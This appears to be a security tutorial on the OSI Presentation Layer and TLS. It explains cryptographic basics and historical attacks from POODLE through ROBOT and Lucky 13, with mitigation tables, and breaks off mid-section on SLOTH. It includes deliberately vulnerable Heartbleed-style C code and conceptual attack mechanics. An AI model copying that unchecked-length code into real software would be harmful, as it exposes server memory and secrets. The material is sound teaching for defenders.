## 1. Understanding the OSI Model — Full Context

### What is the OSI Model?

The **OSI (Open Systems Interconnection)** model is a conceptual framework used to describe how different network protocols interact and communicate across a network. It was developed by the **ISO (International Organization for Standardization)** in 1984.

Think of it as a **blueprint** divided into 7 distinct layers. Each layer has a specific job, and each communicates with the layers immediately above and below it.

```
┌─────────────────────────────────────────────┐
│  Layer 7 — Application    │ HTTP, FTP, SMTP  │
├─────────────────────────────────────────────┤
│  Layer 6 — Presentation   │ SSL/TLS, MIME    │  ← OUR FOCUS
├─────────────────────────────────────────────┤
│  Layer 5 — Session        │ NetBIOS, RPC     │
├─────────────────────────────────────────────┤
│  Layer 4 — Transport      │ TCP, UDP         │
├─────────────────────────────────────────────┤
│  Layer 3 — Network        │ IP, ICMP         │
├─────────────────────────────────────────────┤
│  Layer 2 — Data Link      │ Ethernet, MAC    │
├─────────────────────────────────────────────┤
│  Layer 1 — Physical       │ Cables, Signals  │
└─────────────────────────────────────────────┘
```

### Why Layer Understanding Matters for Security

Every layer introduces its own attack surface. A skilled security professional must understand all 7 layers because:
- Attackers exploit weaknesses at **any** layer
- Defenses at one layer often depend on integrity at another
- Multi-layer attacks (e.g., combining L3 spoofing with L6 SSL stripping) are common

## 2. Layer 6: The Presentation Layer — Deep Dive

### Definition

The **Presentation Layer** (Layer 6) acts as a **translator** and **formatter** between the application layer (Layer 7) and the session layer (Layer 5). Its primary job is to ensure that data sent from one application can be **understood** by the receiving application, even if the two systems use different internal formats.

### Analogy

Imagine two people — one speaks French, one speaks Japanese. A skilled **interpreter** stands between them, translating messages in both directions, ensuring neither party misunderstands. That interpreter is Layer 6.

### In Modern Networking

It is important to understand that in modern TCP/IP networking, the OSI model's layer distinctions are often blurred. For practical purposes, **Layer 6 functions are typically embedded within:**
- Application protocols (HTTP, SMTP, etc.)
- Dedicated security protocols (SSL/TLS)
- Middleware and runtime libraries

However, understanding Layer 6 as a conceptual entity is crucial for identifying **where security vulnerabilities originate**.

## 3. Core Functions of Layer 6

### 3.1 Data Translation (Encoding/Decoding)

**What it means:** Converting data from one format to another.

- Translating between **ASCII** (American Standard Code for Information Interchange) and **EBCDIC** (Extended Binary Coded Decimal Interchange Code)
- Converting between different **character sets** (UTF-8, UTF-16, Latin-1, etc.)
- Encoding binary data for text-safe transmission (Base64, Hex)

> **ASCII** = A standard encoding where each character maps to a number (e.g., 'A' = 65).  
> **UTF-8** = A variable-width encoding that supports all Unicode characters while being backward-compatible with ASCII.

### 3.2 Data Compression

**What it means:** Reducing the size of data before transmission to save bandwidth and increase speed.

- **Lossless compression:** Data is reconstructed perfectly (ZIP, DEFLATE, LZ77, gzip)
- **Lossy compression:** Some data is discarded (JPEG, MP3 — acceptable for media)

> **Bandwidth** = The maximum amount of data that can be transmitted over a connection per second.

### 3.3 Data Encryption and Decryption

**What it means:** Transforming plaintext data into ciphertext (unreadable form) so that only authorized parties can read it.

- This is arguably the **most security-critical** function at Layer 6
- Implemented primarily via **SSL/TLS protocols**
- Protects data **in transit** (as it moves across the network)

> **Plaintext** = Original readable data.  
> **Ciphertext** = Encrypted, unreadable version of data.  
> **In transit** = Data moving over a network (as opposed to "at rest" = stored data).

### 3.4 Data Formatting

**What it means:** Ensuring data structures are properly formatted for the receiving system.

- Converting between data serialization formats (JSON, XML, Protocol Buffers)
- Handling multimedia formats (JPEG, PNG, MPEG, GIF)
- Managing document formats (PDF, DOCX, HTML)

### 3.5 Character Set Conversion

Mapping characters between different encoding standards to ensure that symbols, letters, and special characters are correctly interpreted across different systems and locales.

## 4. Protocols and Technologies at Layer 6

### 4.1 SSL (Secure Sockets Layer)

- **Created by:** Netscape, 1990s
- **Status:** **Deprecated and obsolete** — all versions (SSL 2.0, SSL 3.0) are broken
- **Function:** Provided encryption between client and server
- **History:**
  - SSL 1.0 — Never released publicly
  - SSL 2.0 — Released 1995, major flaws, deprecated 2011 (RFC 6176)
  - SSL 3.0 — Released 1996, vulnerable to POODLE, deprecated 2015 (RFC 7568)

### 4.2 TLS (Transport Layer Security)

- **Successor to SSL** — do not use the terms interchangeably
- **Status:** TLS 1.2 is current minimum; **TLS 1.3 is the recommended standard**
- **History:**
  - TLS 1.0 — Released 1999 (RFC 2246), deprecated 2021
  - TLS 1.1 — Released 2006 (RFC 4346), deprecated 2021
  - TLS 1.2 — Released 2008 (RFC 5246), still widely used
  - TLS 1.3 — Released 2018 (RFC 8446), current gold standard

> **RFC** = Request for Comments — official documents that define internet standards.

### 4.3 MIME (Multipurpose Internet Mail Extensions)

- **Purpose:** Defines how non-ASCII content (images, audio, video, attachments) is encoded for email transmission
- **Example MIME types:** `text/html`, `image/jpeg`, `application/json`, `multipart/form-data`
- **Security relevance:** MIME type confusion can lead to content-type sniffing attacks

## 5. SSL/TLS — The Heart of L6 Security

### 5.1 What is TLS?

TLS (Transport Layer Security) is a **cryptographic protocol** that provides:
1. **Confidentiality** — No one can read the data (encryption)
2. **Integrity** — No one can tamper with the data (MAC/HMAC)
3. **Authentication** — You are talking to who you think you are (certificates)

### 5.2 The TLS Handshake (TLS 1.2) — Step by Step

The **handshake** is the initial negotiation process where client and server agree on how to communicate securely.

```
Client                                      Server
  |                                           |
  |-------- ClientHello ---------------------->|
  |  (TLS version, cipher suites, random nonce)|
  |                                           |
  |<-------- ServerHello --------------------|
  |  (chosen cipher suite, random nonce)      |
  |                                           |
  |<-------- Certificate -------------------|
  |  (server's public key cert)              |
  |                                           |
  |<-------- ServerHelloDone ---------------|
  |                                           |
  |-------- ClientKeyExchange --------------->|
  |  (pre-master secret, encrypted with       |
  |   server's public key)                    |
  |                                           |
  |-------- ChangeCipherSpec ---------------->|
  |-------- Finished ----------------------->|
  |                                           |
  |<-------- ChangeCipherSpec --------------|
  |<-------- Finished ----------------------|
  |                                           |
  |===== Encrypted Application Data ========>|
```

**Key Terms Explained:**
- **ClientHello:** Client announces supported TLS versions and cipher suites
- **Cipher Suite:** A combination of algorithms for key exchange, authentication, bulk encryption, and message authentication. Example: `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`
- **Certificate:** A digital document that proves the server's identity (signed by a CA)
- **Pre-master secret:** A secret value from which the session keys are derived
- **ChangeCipherSpec:** Signal that future messages will be encrypted

### 5.3 Anatomy of a Cipher Suite

```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 │     │      │        │       │    │
 │     │      │        │       │    └── Hash algorithm for HMAC
 │     │      │        │       └─────── Mode of operation
 │     │      │        └─────────────── Symmetric cipher + key size
 │     │      └──────────────────────── Authentication algorithm
 │     └─────────────────────────────── Key exchange algorithm
 └───────────────────────────────────── Protocol
```

- **ECDHE** = Elliptic Curve Diffie-Hellman Ephemeral (key exchange, provides Forward Secrecy)
- **RSA** = RSA algorithm (authentication via certificate)
- **AES-256** = Advanced Encryption Standard with 256-bit key (bulk encryption)
- **GCM** = Galois/Counter Mode (AEAD — provides both encryption and integrity)
- **SHA384** = Secure Hash Algorithm (message authentication)

### 5.4 Forward Secrecy (Perfect Forward Secrecy)

> **Definition:** A property ensuring that session keys cannot be compromised even if the server's long-term private key is later obtained by an attacker.

**How it works:**
- Without FS: Client encrypts the pre-master secret with the server's public key. If the private key is stolen later, an attacker can decrypt all past sessions.
- With FS (using ECDHE/DHE): Fresh, temporary (ephemeral) keys are generated for each session. Even if the long-term private key is stolen, past sessions remain encrypted.

**Cipher suites with Forward Secrecy:** Any suite using **ECDHE** or **DHE** for key exchange.

### 5.5 TLS 1.3 Handshake (Simplified)

TLS 1.3 radically simplified the handshake:

```
Client                              Server
  |                                   |
  |------ ClientHello + KeyShare ---->|
  |  (TLS 1.3, key share, random)     |
  |                                   |
  |<----- ServerHello + KeyShare ----|
  |<----- {EncryptedExtensions} -----|
  |<----- {Certificate} -------------|
  |<----- {CertificateVerify} -------|
  |<----- {Finished} ----------------|
  |                                   |
  |------- {Finished} --------------->|
  |                                   |
  |===== Application Data ==========>|
```

**Key improvements:**
- Handshake requires **1 round trip** instead of 2 (1-RTT)
- **0-RTT resumption** possible (with caveats)
- Removed all weak and legacy cipher suites
- All handshake messages after ServerHello are **encrypted**

## 6. Cryptographic Fundamentals

Before understanding attacks, you must understand the building blocks.

### 6.1 Symmetric Encryption

**Definition:** The same key is used for both encryption and decryption.

```
Plaintext + Key ──→ [Encrypt] ──→ Ciphertext
Ciphertext + Key ──→ [Decrypt] ──→ Plaintext
```

**Common algorithms:**
- **AES (Advanced Encryption Standard):** Current gold standard. Key sizes: 128, 192, 256 bits.
- **3DES (Triple DES):** Applies DES three times. Old, slow, being phased out.
- **RC4:** Stream cipher, completely broken — never use.

**Modes of Operation:**
- **CBC (Cipher Block Chaining):** Each block XORed with the previous ciphertext block. Vulnerable to padding oracle attacks.
- **GCM (Galois/Counter Mode):** Provides both encryption and authentication (AEAD). Currently preferred.
- **CTR (Counter Mode):** Turns block cipher into stream cipher.
- **ECB (Electronic Codebook):** Never use — identical plaintext blocks produce identical ciphertext.

> **AEAD** = Authenticated Encryption with Associated Data — encryption that also ensures data integrity.

### 6.2 Asymmetric (Public Key) Encryption

**Definition:** Uses a mathematically linked key pair: **public key** (shareable) and **private key** (secret).

```
Plaintext + Public Key  ──→ [Encrypt] ──→ Ciphertext
Ciphertext + Private Key ──→ [Decrypt] ──→ Plaintext
```

**Common algorithms:**
- **RSA (Rivest–Shamir–Adleman):** Based on difficulty of factoring large numbers. Common key sizes: 2048, 4096 bits.
- **ECC (Elliptic Curve Cryptography):** Based on elliptic curve discrete logarithm problem. Smaller keys, equivalent security to larger RSA keys. Example: ECDSA, ECDH.
- **Diffie-Hellman (DH):** Key exchange protocol, not encryption. Allows two parties to establish a shared secret over an insecure channel.

### 6.3 Hash Functions

**Definition:** One-way functions that produce a fixed-size output (digest/hash) from any input. Should be collision-resistant, pre-image resistant, and second pre-image resistant.
```
| Algorithm | Output Size | Status |
|-----------|-------------|--------|
| MD5 | 128 bits | Broken — never use |
| SHA-1 | 160 bits | Deprecated — avoid |
| SHA-256 | 256 bits | Safe — widely used |
| SHA-384 | 384 bits | Safe — TLS preferred |
| SHA-512 | 512 bits | Safe |
| SHA-3 | Variable | Safe — Keccak-based |
```
### 6.4 Message Authentication Code (MAC)

**Definition:** A short piece of information used to authenticate a message — ensures integrity and authenticity.

- **HMAC (Hash-based MAC):** Uses a hash function + secret key
- **GMAC:** Used in GCM mode (combined with encryption = AEAD)
- **CMAC:** Cipher-based MAC

### 6.5 Digital Signatures

**Definition:** A cryptographic mechanism that proves both the authenticity (who sent it) and integrity (was it tampered with) of a message.

```
Message + Private Key ──→ [Sign] ──→ Signature
Message + Public Key + Signature ──→ [Verify] ──→ Valid/Invalid
```

**Common algorithms:** RSA-PKCS1v15, RSA-PSS, ECDSA, EdDSA

### 6.6 Key Exchange Protocols

**Definition:** Methods that allow two parties to establish a shared secret over an insecure channel without ever transmitting the secret itself.

**Diffie-Hellman Exchange:**
```
Public params: prime p, generator g

Alice chooses secret a,  computes A = g^a mod p  → sends A to Bob
Bob   chooses secret b,  computes B = g^b mod p  → sends B to Alice

Alice computes: B^a mod p = g^(ab) mod p
Bob   computes: A^b mod p = g^(ab) mod p

Both now have the shared secret: g^(ab) mod p
```

Neither party transmitted the secret itself. An eavesdropper who sees A and B cannot easily compute g^(ab).

## 8. SSL/TLS Protocol Attacks

### 8.1 POODLE Attack

**Full Name:** Padding Oracle On Downgraded Legacy Encryption  
**CVE:** CVE-2014-3566  
**Published:** October 2014, Google Security Team (Bodo Möller, Thai Duong, Krzysztof Kotowicz)

#### What is a Padding Oracle?

Before understanding POODLE, you need to understand **block ciphers** and **padding**.

**Block cipher:** Encrypts data in fixed-size chunks (blocks). AES uses 16-byte blocks.

**Problem:** If plaintext is not a multiple of the block size, we need to add extra bytes to fill the last block. This is called **padding**.

**PKCS#7 Padding Rule:** If N bytes of padding are needed, each padding byte has the value N.
```
If 3 bytes needed: [data][03][03][03]
If 5 bytes needed: [data][05][05][05][05][05]
If 16 bytes needed: Full block of [10][10]...[10] (16 times)
```

A **padding oracle** is a system that reveals whether the padding of a decrypted message is valid or invalid — essentially leaking information about the decryption.

#### How POODLE Works

**Target:** SSL 3.0 with CBC mode cipher suites

**Step 1: Force SSL 3.0**  
Modern browsers try TLS first. If the TLS handshake fails (even if deliberately forced to fail by the attacker), they fall back to SSL 3.0. Attackers trigger this fallback.

**Step 2: Exploit SSL 3.0's CBC Padding Weakness**  
In SSL 3.0, the padding bytes are not integrity-checked. The value of padding bytes is not verified — only the last byte is checked for length. This means:
- An attacker can manipulate CBC-encrypted blocks
- The server's response (error vs. success) reveals whether the padding was valid
- Through repeated manipulation, the attacker can decrypt one byte at a time

**Step 3: Use JavaScript on victim's browser**  
The attacker needs the victim to make SSL 3.0 requests (via a malicious script injected into an HTTP page), then intercepts these using network access (same network or via MitM).

**Mathematical basis of CBC padding oracle:**
```
In CBC mode:
Plaintext_block[i] = Decrypt(Ciphertext_block[i]) XOR Ciphertext_block[i-1]

If we control Ciphertext_block[i-1], we can influence the decrypted padding.
By trying all 256 possible values for the last byte of Ciphertext_block[i-1],
one value will produce valid padding. That value reveals the plaintext byte.
```

**Impact:** An attacker can decrypt session cookies, authentication tokens, and sensitive data.

#### Mitigation — POODLE
```
| Mitigation | Description |
|------------|-------------|
| **Disable SSL 3.0** | Most critical — RFC 7568 mandates this |
| **Implement TLS_FALLBACK_SCSV** | A pseudo-cipher suite that prevents inappropriate fallback |
| **Use TLS 1.2+** | Modern clients and servers should refuse SSL 3.0 |
| **POODLE on TLS** | Some TLS implementations had same flaw — patch them |
```
**TLS_FALLBACK_SCSV (Signaling Cipher Suite Value):**
- Client includes this special value in downgraded handshakes
- Server, if it supports a higher version, immediately terminates connection
- Prevents legitimate fallback abuse by attackers

### 8.2 BEAST Attack

**Full Name:** Browser Exploit Against SSL/TLS  
**CVE:** CVE-2011-3389  
**Published:** 2011, Thai Duong and Juliano Rizzo  
**Targets:** TLS 1.0 with CBC mode

#### Understanding the CBC Initialization Vector (IV) Problem

**IV (Initialization Vector):** A random value used in CBC encryption to ensure that the same plaintext encrypts to different ciphertext each time.

In CBC mode, the IV for block 1 of the message is explicit. But for block 2+, the previous ciphertext block serves as the IV.

**TLS 1.0's fatal flaw:** The IV for a **new record** is the **last ciphertext block of the previous record**. This is predictable.

#### How BEAST Works

```
TLS 1.0 Record 1: [IV₁][Block₁][Block₂]...[Blockₙ]
TLS 1.0 Record 2: [Blockₙ used as IV₂][Block₁]...
```

Since the attacker can observe the ciphertext (they're on the network) and knows the next IV (it's the last ciphertext block they just saw), they can:

1. **Observe** the IV for the next encryption operation
2. **Inject chosen plaintext** (via JavaScript running in the victim's browser)
3. **Guess** the secret (e.g., a cookie) byte by byte — if their guess is correct, the ciphertext block matches a known ciphertext block

This is a **chosen-plaintext attack** — the attacker can choose plaintext to be encrypted and observe the result.

**Requirement:** Attacker needs:
- Network position to observe ciphertext
- Ability to inject JavaScript into victim's browser (same-origin restrictions bypass via a known exploit in browser)

#### Mitigation — BEAST
```
| Mitigation | Description |
|------------|-------------|
| **Upgrade to TLS 1.1+** | Fixed the IV issue — uses random IVs per record |
| **Prioritize RC4** (historical) | RC4 is not block cipher, so not vulnerable. **BUT RC4 is now broken — do not use.** |
| **1/n-1 record splitting** | Split records to mitigate predictable IV |
| **Use TLS 1.2 with GCM** | AEAD modes are immune |
| **Modern browsers** | All modern browsers implement mitigations |
```

### 8.3 CRIME Attack

**Full Name:** Compression Ratio Info-leak Made Easy  
**CVE:** CVE-2012-4929  
**Published:** 2012, Thai Duong and Juliano Rizzo  
**Targets:** TLS/SSL with compression enabled

#### Conceptual Foundation: How Compression Leaks Information

Compression works by replacing repeated patterns with shorter representations.

**Key insight:** If a secret string appears in the plaintext, and if we can add content near it, compressing the combined plaintext will produce **different output sizes** depending on whether our guess matches part of the secret.

```
plaintext = "Cookie: session=abc123; [attacker_data]"

If attacker_data = "session=abc123" → compression finds repeated "session=abc123"
                                     → compressed size is SMALLER

If attacker_data = "session=xyz789" → no repeated pattern
                                     → compressed size is LARGER
```

**This reveals the secret one character at a time.**

#### How CRIME Works

1. **Prerequisite:** TLS compression is enabled (DEFLATE), attacker can observe ciphertext length
2. **Victim's browser** sends many HTTPS requests to target (via injected JavaScript)
3. Each request contains the **secret cookie** (sent automatically) + **attacker-controlled data**
4. Attacker observes **size of encrypted response** — smaller = compression found a match
5. By trying all possible characters, attacker recovers the cookie one byte at a time

**Why does ciphertext size leak?** Even though data is encrypted, the **length** of the ciphertext reflects the length of the compressed plaintext. Compression size is visible.

#### Mitigation — CRIME
```
| Mitigation | Description |
|------------|-------------|
| **Disable TLS compression** | Primary fix — RFC 7525 recommends no TLS compression |
| **Disable HTTP compression for secrets** | Secrets (cookies, tokens) shouldn't be in compressed responses |
| **CSRF tokens** | Adding unique tokens makes injection harder |
| **Use HTTPS Strict** | Prevents downgrade that might enable compression |
```
**All major browsers and servers have disabled TLS compression since 2012.**

### 8.4 BREACH Attack

**Full Name:** Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext  
**CVE:** CVE-2013-3587  
**Published:** 2013, Angelo Prado, Neal Harris, Yoel Gluck  
**Targets:** HTTP compression (not TLS compression) — works even on TLS 1.3

#### How BREACH Differs from CRIME

CRIME required **TLS-level compression** (disabled as a fix). BREACH exploits **HTTP-level compression** (gzip, deflate) of the HTTP response body — which is still widely used for performance.

**Key conditions:**
1. Server uses HTTP-level compression (gzip/deflate on response body)
2. Server reflects user input in the response (e.g., a search query echoed back)
3. Response contains a secret (e.g., CSRF token)
4. All in the same compressed HTTP response

#### Attack Mechanism

```
Request URL: https://target.com/search?q=ATTACKER_CONTROLLED
Response body (compressed): 
  "...CSRF_TOKEN: s3cr3t...search query: ATTACKER_CONTROLLED..."

If attacker tries q="CSRF_TOKEN: s3" → smaller response (pattern match)
If attacker tries q="CSRF_TOKEN: xx" → larger response (no match)
```

By controlling the query and measuring response size, attacker can extract the CSRF token character by character.

#### Mitigation — BREACH
```
| Mitigation | Description |
|------------|-------------|
| **CSRF token masking** | XOR the CSRF token with a random value per request — prevents pattern matching |
| **Secret isolation** | Don't mix secrets with user-controlled content in same compressed context |
| **Disable compression for sensitive pages** | Tradeoff: performance vs. security |
| **Length hiding** | Add random padding to responses to mask size |
| **Separate secret delivery** | Deliver secrets in HTTP headers, not body |
```

### 8.5 Heartbleed

**CVE:** CVE-2014-0160  
**Published:** April 7, 2014  
**Affected:** OpenSSL versions 1.0.1 through 1.0.1f  
**Discovery:** Neel Mehta (Google Security), Codenomicon

#### What is the TLS Heartbeat Extension?

The **Heartbeat Extension** (RFC 6520) is a keep-alive mechanism for TLS connections. It works like a ping:

1. Client sends: "Here is 10 bytes of data. Please send it back."
2. Server reads 10 bytes, sends them back
3. This proves the connection is still alive

#### The Fatal Bug — Out-of-Bounds Read

The bug was a **missing bounds check** in the OpenSSL implementation:

**What should happen:**
```
Client says: "I'm sending 10 bytes: [ABCDEFGHIJ]"
Server reads EXACTLY 10 bytes from memory
Server echoes back: [ABCDEFGHIJ]
```

**What Heartbleed allowed:**
```
Client says: "I'm sending 65535 bytes" but actually only sends 10 bytes
Server TRUSTS the client's claimed length (no validation!)
Server reads 65535 bytes from memory starting at the 10 bytes
But the next 65525 bytes are whatever is in server memory — private keys,
passwords, session tokens, private data of other users...
Server sends all that back to the attacker
```

**In pseudocode (vulnerable):**
```c
// Vulnerable code (simplified)
void handle_heartbeat(uint8_t *payload, uint16_t payload_length) {
    uint8_t *response = malloc(payload_length); // trusts client
    memcpy(response, payload, payload_length);  // copies beyond actual data!
    send(response, payload_length);
}

// Secure code
void handle_heartbeat(uint8_t *payload, uint16_t actual_received, uint16_t claimed_length) {
    if (claimed_length > actual_received) {
        // Reject! Claimed more than sent.
        return;
    }
    // ... proceed normally
}
```

#### Impact of Heartbleed

- **Severity:** Critical — CVSS score 7.5
- **Affected servers:** Estimated 17% of all HTTPS servers at disclosure
- **What leaked:** Private keys, session tokens, passwords, other users' data — up to 64KB per request, repeatable
- **No logs:** Attack left no traces in server logs

#### Mitigation — Heartbleed
```
| Mitigation | Description |
|------------|-------------|
| **Patch OpenSSL immediately** | Upgrade to 1.0.1g or later |
| **Revoke and reissue certificates** | Old private key may have been stolen |
| **Invalidate all session tokens** | Force all users to re-authenticate |
| **Rotate all passwords** | Advise password changes |
| **Disable Heartbeat extension** | Compile OpenSSL with `-DOPENSSL_NO_HEARTBEATS` |
```

### 8.6 DROWN Attack

**Full Name:** Decrypting RSA with Obsolete and Weakened eNcryption  
**CVE:** CVE-2016-0800  
**Published:** March 2016  
**Targets:** Servers that support SSLv2, affecting clients using modern TLS via RSA key exchange

#### The Core Concept

DROWN exploits a **cross-protocol attack**: it uses SSLv2 vulnerabilities to break TLS sessions.

**Key prerequisite:** The target server (or any server that shares the same RSA private key) must support SSLv2 — even if the actual client-server communication uses TLS 1.2.

#### How DROWN Works

1. Attacker records many TLS RSA handshakes from the victim
2. Attacker finds or creates a **different server that uses the same RSA private key** and supports SSLv2 (common in misconfigured load balancers or CDNs)
3. Attacker repeatedly connects to the SSLv2 server with **specially crafted messages** that allow partial decryption via SSLv2's export cipher weakness
4. Using **RSA Bleichenbacher's attack** (a padding oracle on RSA PKCS#1 v1.5 encryption), the attacker makes ~1000 connections to the SSLv2 server to break one TLS pre-master secret
5. With the pre-master secret, attacker can decrypt the original TLS session

**General Bleichenbacher Attack:**
The attacker exploits RSA PKCS#1 v1.5 padding — an old RSA encryption padding standard. If a server reveals (even indirectly) whether decrypted data has valid PKCS#1 padding, this creates an oracle that can be used to factor out the session key over many iterations.

#### Mitigation — DROWN
```
| Mitigation | Description |
|------------|-------------|
| **Disable SSLv2 everywhere** | Critical — including all servers sharing certificates |
| **Never reuse private keys** | Unique keys per server prevent cross-protocol attacks |
| **Prefer ECDHE key exchange** | Not vulnerable to Bleichenbacher attacks |
| **Audit shared certificates** | Ensure no server in the trust chain supports SSLv2 |
```

### 8.7 FREAK Attack

**Full Name:** Factoring RSA Export Keys  
**CVE:** CVE-2015-0204  
**Published:** March 2015  
**Targets:** SSL/TLS with RSA_EXPORT cipher suites enabled

#### Historical Context: Export Cryptography

In the 1990s, the U.S. government classified strong cryptography as **munitions** and restricted its export. Software sold internationally had to include weakened "export-grade" cryptography:
- RSA keys limited to **512 bits** (instead of 2048+)
- Symmetric keys limited to 40 or 56 bits

Even after export restrictions were lifted in 2000, many servers and clients **retained support** for these weak "RSA_EXPORT" cipher suites.

#### How FREAK Works

1. **MitM position:** Attacker intercepts TLS handshake
2. **Downgrade:** Attacker modifies the client's "supported cipher suites" list to only contain RSA_EXPORT suites
3. **Server uses weak cipher:** If server supports RSA_EXPORT, it uses a 512-bit RSA key
4. **Factor the key:** A 512-bit RSA key can be factored in **7-12 hours** using cloud computing (~$100)
5. **Decrypt session:** With the private key, attacker can perform MitM and decrypt all traffic

**Why 512-bit RSA is broken:**  
RSA security depends on the difficulty of factoring large numbers. Modern 2048-bit RSA requires astronomical computational effort to factor. But 512-bit keys are now trivially factored using techniques like the General Number Field Sieve (GNFS).

#### Mitigation — FREAK
```
| Mitigation | Description |
|------------|-------------|
| **Disable RSA_EXPORT cipher suites** | Never support export-grade ciphers |
| **Minimum RSA key size 2048 bits** | Or use ECDHE instead |
| **Browser patches** | Modern browsers reject export cipher negotiations |
| **Server audit** | Verify no export ciphers in configuration |
```

### 8.8 Logjam Attack

**CVE:** CVE-2015-4000  
**Published:** May 2015  
**Targets:** TLS connections using DHE (Diffie-Hellman Ephemeral) with weak 512-bit parameters

#### Understanding Diffie-Hellman Parameters

DH key exchange uses a large prime number (p) and a generator (g) as **public parameters**. The security of DH depends on the size of p — attacking DH requires solving the **Discrete Logarithm Problem (DLP)**.

Export-grade DH used **512-bit primes** (trivially solvable now), and even standard configurations often reused **1024-bit primes** (potentially solvable by nation-states using precomputation).

#### How Logjam Works

**Against DHE_EXPORT (512-bit):**
Similar to FREAK — MitM downgrades the negotiation to export-grade DH, then precomputes the DLP for that known prime.

**Against DHE (1024-bit) — Nation-State Threat:**
For a specific 1024-bit prime p, precomputation can be done **once** and the DLP becomes trivially solvable for **any** connection using that prime. Since most servers reused the same few standard DH primes, a nation-state that precomputed DLP for those primes could passively decrypt a large fraction of HTTPS, SMTP, SSH, and VPN traffic.

**TLS Downgrade Component:**
MitM modifies `ClientHello` to only advertise `DHE_EXPORT` cipher suites. If the server accepts, it uses the weak DH parameters.

#### Mitigation — Logjam
```
| Mitigation | Description |
|------------|-------------|
| **Disable DHE_EXPORT cipher suites** | Eliminate export-grade DH |
| **Use 2048-bit or larger DH primes** | Preferably custom-generated (not standard primes) |
| **Prefer ECDHE over DHE** | Elliptic curve DH is resistant — no known precomputation attack |
| **Generate unique DH parameters** | `openssl dhparam -out dhparam.pem 2048` |
| **Browser patches** | Reject DH connections with < 1024-bit parameters |
```

### 8.9 Sweet32 Attack

**CVE:** CVE-2016-2183, CVE-2016-6329  
**Published:** August 2016  
**Targets:** 64-bit block ciphers (3DES, Blowfish) in CBC mode

#### Birthday Paradox — The Mathematical Foundation

> **Birthday Problem:** In a group of 23 people, there's a >50% chance two people share a birthday. 
> In a group of 366 people, it's guaranteed (by pigeonhole).

**Birthday attack on block ciphers:** A block cipher with n-bit block size has 2ⁿ possible blocks. Due to the birthday paradox, after approximately **2^(n/2)** blocks, you expect a collision (two blocks encrypting to the same ciphertext).

For a **64-bit block cipher:** After ~2^32 = 4 billion blocks (~32 GB of data), a collision is expected.

#### How Sweet32 Works

```
In CBC mode with a collision: C[i] = C[j] (two identical ciphertext blocks)
This means: P[i] XOR C[i-1] = P[j] XOR C[j-1]   (after decryption)
Therefore:  P[i] XOR P[j] = C[i-1] XOR C[j-1]    (attackers know right side)

If the attacker knows P[i] (e.g., from HTTP headers, fixed structure),
they can compute P[j]:  P[j] = P[i] XOR C[i-1] XOR C[j-1]
```

**Practical attack:**
1. Attacker needs victim to send ~32 GB over the same 3DES session (achievable in ~1 hour with JavaScript)
2. Attacker monitors ciphertext blocks for collisions
3. Upon finding a collision, extracts plaintext (e.g., session cookie in HTTP headers)

**3DES used 64-bit blocks** despite using 168-bit key — the small block size is the vulnerability.

#### Mitigation — Sweet32
```
| Mitigation | Description |
|------------|-------------|
| **Disable 3DES in TLS** | Remove `DES-CBC3-SHA` and related suites |
| **Use AES** | 128-bit block size — birthday collision at 2^64 blocks (impractical) |
| **Session renegotiation limits** | Limit session lifetime or data volume |
| **Disable Blowfish** | Also uses 64-bit blocks |
```

### 8.10 ROBOT Attack

**Full Name:** Return Of Bleichenbacher's Oracle Threat  
**Published:** December 2017  
**CVE:** Multiple — affects F5, Citrix, Cisco, etc.  
**Targets:** TLS RSA key exchange implementations

#### Bleichenbacher's 1998 Attack

In 1998, Daniel Bleichenbacher demonstrated that if a TLS server reveals (even through timing differences, error codes, or behavior changes) whether decrypted RSA-encrypted data has valid **PKCS#1 v1.5 padding**, an attacker can:

1. Send thousands of modified versions of an intercepted ciphertext
2. Use the server's accept/reject responses as an oracle
3. Iteratively narrow down the plaintext value
4. Eventually recover the full pre-master secret

This is an **adaptive chosen-ciphertext attack**.

**PKCS#1 v1.5 padding format:**
```
0x00 0x02 [random non-zero bytes] 0x00 [actual data]
```

If the server responds differently when this pattern is invalid vs. valid, the oracle exists.

#### ROBOT — The Return

ROBOT showed that numerous major TLS implementations in 2017 **still had variants of Bleichenbacher's oracle** — 19 years after the original paper. Vulnerabilities were found in:
- F5 BIG-IP
- Citrix NetScaler
- Cisco ACE
- Palo Alto Networks
- Radware
- Erlang's TLS implementation
- WolfSSL

**Variants were subtle:** Some had timing differences. Some returned different alert codes. Some had cache behavior differences. All were sufficient to construct an oracle.

#### Mitigation — ROBOT
```
| Mitigation | Description |
|------------|-------------|
| **Disable RSA key exchange** | Use only (EC)DHE — forward secrecy and no decryption oracle |
| **Apply vendor patches** | All affected vendors released patches |
| **Constant-time RSA decryption** | Prevent timing-based oracles |
| **TLS 1.3** | Removed RSA key exchange entirely |
```

### 8.11 Lucky 13 Attack

**CVE:** CVE-2013-0169  
**Published:** February 2013  
**Targets:** TLS/DTLS with CBC mode

#### The Padding Oracle via Timing

Lucky 13 is a **timing side-channel attack** on TLS-CBC padding validation. The name comes from the TLS record header being 13 bytes.

**The problem in MAC-then-Pad-then-Encrypt (MtPE):**
```
Encryption: Pad → MAC → Encrypt
Decryption: Decrypt → Verify Padding → Verify MAC → Process
```

During decryption, depending on how many padding bytes there are, different amounts of MAC computation occur. This leads to **measurable timing differences**:
- Valid padding with N bytes → MAC computation over (data_length - N) bytes
- Invalid padding → MAC computation over full data to prevent early exit

But subtle timing leaks still occurred due to:
- Cache effects
- Branch prediction
- Different code paths

#### Mitigation — Lucky 13
```
| Mitigation | Description |
|------------|-------------|
| **Use AEAD cipher suites (GCM)** | GCM is not vulnerable — no padding |
| **Constant-time MAC verification** | Verify MAC in constant time regardless of padding |
| **Apply patches** | OpenSSL, NSS, GnuTLS all released fixes |
| **TLS 1.3** | Removed CBC mode entirely |
```
---

### 8.12 SLOTH Attack

**Full Name:** Security Losses from Obsolete and Truncated Transcript Hashes  
**Published:** 2016  
**Targets:** TLS, IKE, SSH, DTLS using MD5 or SHA-1 in handshake transcripts

#### The Concept

SLOTH demonstrated that **transcript collision attacks** are practical against protocols using MD5 or SHA-1.

**Transcript:** A hash of all handshake messages used for verification.

If MD5 is used in any security-critical handshake component, an attacker with the ability to generate hash collisions (which MD5 is vulnerable to) can forge handshake messages, potentially enabling impersonation or MitM attacks.

**SLOTH on TLS:**
- TLS 1.2 allows the use of MD5 in the PRF (Pseudo-Random Function) for some cipher suites
- TLS ClientCertificateVerify message used MD5 in some implementations

